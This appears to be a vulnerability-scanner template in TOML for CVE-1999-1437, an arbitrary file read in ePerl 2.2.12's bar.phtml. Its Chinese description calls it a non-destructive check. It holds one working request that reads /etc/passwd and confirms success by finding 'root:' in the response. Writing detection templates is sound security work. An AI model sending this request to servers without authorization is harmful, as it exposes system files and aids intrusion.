[info]
author = "ave"
description = "验证 ePerl 2.2.12 的 bar.phtml 是否允许未授权远程攻击者通过传递目标文件完整路径参数读取服务器任意文件（如 /etc/passwd）。该 PoC 仅做安全无损的文件读取验证，不执行任何破坏性操作。"
id = "POC-AVE-1999-1274"
name = "CVE-1999-1437 ePerl bar.phtml 任意文件读取 PoC"
severity = "high"
tags = ["ave-1999-1274"]
vuln_id = [
    "CVE-1999-1437",
    "AVE-1999-1274",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/bar.phtml//etc/passwd"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
